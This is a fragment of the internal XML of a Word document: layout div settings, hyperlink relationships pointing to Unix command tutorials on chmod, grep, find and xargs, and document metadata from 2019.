          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="2123961747">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1122920744">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1547134062">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1988169213">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1105075151">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="381026536">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1363164285">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1206066972">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="220990814">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="2060980627">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1775594770">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1043598861">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="647515106">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="911085602">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="2053571237">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1977951262">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="147598522">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="896207023">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="792408015">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="632373234">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="374164177">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="940187017">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="240"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1376928538">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="666248881">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1575318057">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1668092781">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1843347536">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="976225093">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="240"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1194617872">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="560949625">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
            <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
            <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1527326573">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:left w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
                <w:bottom w:val="dotted" w:sz="4" w:space="1" w:color="auto"/>
                <w:right w:val="dotted" w:sz="4" w:space="4" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1753577346">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1727878125">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1293516714">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="972369696">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1797410112">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1319110669">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="437"/>
          <w:marBottom w:val="437"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="306128718">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="single" w:sz="18" w:space="5" w:color="BFCADA"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="2023122339">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="87897749">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="180"/>
          <w:divBdr>
            <w:top w:val="dotted" w:sz="2" w:space="8" w:color="BBBBBB"/>
            <w:left w:val="dotted" w:sz="6" w:space="22" w:color="BBBBBB"/>
            <w:bottom w:val="dotted" w:sz="2" w:space="1" w:color="FFFFFF"/>
            <w:right w:val="dotted" w:sz="6" w:space="11" w:color="BBBBB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javarevisited.blogspot.sg/2012/03/10-example-of-chmod-command-in-unix.html" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2012/06/10-xargs-command-example-in-linux-unix.html" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/06/10-examples-of-grep-command-in-unix-and.html" TargetMode="External"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://javarevisited.blogspot.com/2011/06/vi-editor-in-unix-example-tutorial-and.html"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click.linksynergy.com/fs-bin/click?id=JVFxdTr9V80&amp;subid=0&amp;offerid=323058.1&amp;type=10&amp;tmpid=14538&amp;RD_PARM1=https%3A%2F%2Fwww.udemy.com%2Fbash-shell-scripting-crash-course-for-beginners%2F" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.jpeg"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/05/unix-command-interview-questions.html" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.java67.com/2017/08/how-to-find-large-files-with-size-in-Linux.html" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/04/unix-commands-tutorial-and-tips-for.html" TargetMode="External"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/03/10-find-command-in-unix-examples-basic.html" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.amazon.com/grep-Pocket-Reference-OReilly/dp/0596153600?tag=javamysqlanta-20"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click.linksynergy.com/fs-bin/click?id=JVFxdTr9V80&amp;subid=0&amp;offerid=323058.1&amp;type=10&amp;tmpid=14538&amp;RD_PARM1=https%3A%2F%2Fwww.udemy.com%2Flearn-linux-in-5-days%2F" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://java67.blogspot.com/2012/12/how-to-remove-all-white-space-from-String-beginning-end-between.html" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://click.linksynergy.com/fs-bin/click?id=JVFxdTr9V80&amp;subid=0&amp;offerid=323058.1&amp;type=10&amp;tmpid=14538&amp;RD_PARM1=https%3A%2F%2Fwww.udemy.com%2Flinux-administration-bootcamp%2F" TargetMode="External"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/03/10-find-command-in-unix-examples-basic.html"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javarevisited.blogspot.com/2012/03/how-to-find-file-and-directory-size-in.html" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item3.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29.jpeg"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2012/06/10-xargs-command-example-in-linux-unix.html" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://4.bp.blogspot.com/-Ldd6YJha0K4/W2sDiT1xmII/AAAAAAAAL_A/wtWGhjnt3W0je_Y5zzF7EUkvXAw10s5RQCLcBGAs/s1600/grep%2Bcommand%2Bexample%2Bjulia.jpg" TargetMode="External"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://javarevisited.blogspot.com/2011/06/vi-editor-in-unix-example-tutorial-and.html" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.jpeg"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/11/file-permissions-in-unix-linux-example.html" TargetMode="External"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/04/symbolic-link-or-symlink-in-unix-linux.html" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://javarevisited.blogspot.com/2011/06/vi-editor-in-unix-example-tutorial-and.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hongkiat.com/blog/most-asked-questions-linux/" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/08/unix-sort-command-example-tutorial.html" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image32.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1.jpeg"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.java67.com/2012/10/unix-command-to-find-symbolic-link-or.html" TargetMode="External"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.jpeg"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/03/unix-command-tutorial-working-fast-in.html" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.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1.bp.blogspot.com/-yUKUfVmWJOg/TZ_n4LWKPvI/AAAAAAAAAGE/bG4IdXUV3BY/s1600/linux_50x50.jpg" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image27.jpeg"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2012/08/delete-empty-files-directories-unix.html" TargetMode="External"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://javarevisited.blogspot.com/2011/06/special-bash-parameters-in-script-linu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it.yadav\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61</TotalTime>
  <Pages>37</Pages>
  <Words>6039</Words>
  <Characters>34427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 Yadav (Attra)</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Amit Kumar Yadav (Attra)</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-08-07T10:32:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-08-07T11:33:00Z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